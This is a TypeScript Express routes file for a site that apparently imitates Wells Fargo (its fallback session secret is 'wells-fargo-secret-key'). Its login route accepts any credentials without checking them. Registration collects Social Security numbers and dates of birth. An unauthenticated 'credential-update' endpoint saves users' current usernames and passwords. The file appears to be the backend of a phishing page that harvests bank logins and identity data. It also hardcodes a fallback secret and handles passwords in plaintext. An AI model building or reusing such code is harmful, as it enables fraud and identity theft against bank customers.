import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import session from "express-session";
import pgSession from "connect-pg-simple";
import pg from "pg";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
});

const registerSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  email: z.string().email("Invalid email").optional(),
  phone: z.string().optional(),
  dateOfBirth: z.string().optional(),
  ssn: z.string().optional(),
});

const verifyIdentitySchema = z.object({
  verificationType: z.enum(["username", "dateOfBirth", "ssn"]),
  value: z.string().min(1, "Value is required"),
});

const resetPasswordSchema = z.object({
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  const PgStore = pgSession(session);
  const pool = new pg.Pool({
    connectionString: process.env.DATABASE_URL,
  });

  app.use(
    session({
      store: new PgStore({
        pool,
        tableName: "sessions",
        createTableIfMissing: true,
      }),
      secret: process.env.SESSION_SECRET || "wells-fargo-secret-key",
      resave: false,
      saveUninitialized: false,
      cookie: {
        secure: process.env.NODE_ENV === "production",
        httpOnly: true,
        maxAge: 30 * 60 * 1000,
      },
    })
  );

  app.post("/api/auth/login", async (req, res) => {
    try {
      const result = loginSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid credentials format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username } = result.data;

      (req.session as any).userId = "guest";
      (req.session as any).username = username;

      return res.status(200).json({ 
        message: "Login successful",
        user: { id: "guest", username: username }
      });
    } catch (error) {
      console.error("Login error:", error);
      return res.status(500).json({ 
        message: "An error occurred during login" 
      });
    }
  });

  app.post("/api/auth/register", async (req, res) => {
    try {
      const result = registerSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid registration data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password, email, phone, dateOfBirth, ssn } = result.data;

      const existingUser = await storage.getUserByUsername(username);
      
      if (existingUser) {
        return res.status(409).json({ 
          message: "Username already exists" 
        });
      }

      const user = await storage.createUser({ username, password, email, phone, dateOfBirth, ssn });

      (req.session as any).userId = user.id;
      (req.session as any).username = user.username;

      return res.status(201).json({ 
        message: "Registration successful",
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Registration error:", error);
      return res.status(500).json({ 
        message: "An error occurred during registration" 
      });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(401).json({ message: "User not found" });
      }

      return res.status(200).json({ 
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Auth check error:", error);
      return res.status(500).json({ message: "An error occurred" });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Failed to logout" });
      }
      res.clearCookie("connect.sid");
      return res.status(200).json({ message: "Logged out successfully" });
    });
  });

  app.post("/api/auth/verify-identity", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      const result = verifyIdentitySchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid verification data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { verificationType, value } = result.data;

      const isVerified = await storage.verifyUserIdentity(userId, verificationType, value);
      
      if (!isVerified) {
        return res.status(400).json({ 
          message: "Verification failed. The information provided does not match our records." 
        });
      }

      (req.session as any).identityVerified = true;

      return res.status(200).json({ 
        message: "Identity verified successfully",
        verified: true
      });
    } catch (error) {
      console.error("Verification error:", error);
      return res.status(500).json({ 
        message: "An error occurred during verification" 
      });
    }
  });

  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      const identityVerified = (req.session as any).identityVerified;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      if (!identityVerified) {
        return res.status(403).json({ message: "Identity not verified. Please verify your identity first." });
      }

      const result = resetPasswordSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid password data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { newPassword } = result.data;

      const updated = await storage.updatePassword(userId, newPassword);
      
      if (!updated) {
        return res.status(500).json({ 
          message: "Failed to update password" 
        });
      }

      (req.session as any).identityVerified = false;

      return res.status(200).json({ 
        message: "Password updated successfully"
      });
    } catch (error) {
      console.error("Password reset error:", error);
      return res.status(500).json({ 
        message: "An error occurred during password reset" 
      });
    }
  });

  const credentialUpdateSchema = z.object({
    originalUsername: z.string().min(1, "Username is required"),
    currentPassword: z.string().min(1, "Current password is required"),
    newUsername: z.string().optional(),
    newPassword: z.string().optional(),
    updateType: z.enum(["password", "username", "both"]),
  });

  app.post("/api/auth/credential-update", async (req, res) => {
    try {
      const result = credentialUpdateSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid data format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const saved = await storage.saveCredentialUpdate(result.data);

      return res.status(200).json({ 
        message: "Credentials saved successfully",
        id: saved.id
      });
    } catch (error) {
      console.error("Credential update error:", error);
      return res.status(500).json({ 
        message: "An error occurred while saving credentials" 
      });
    }
  });

  return httpServer;
}
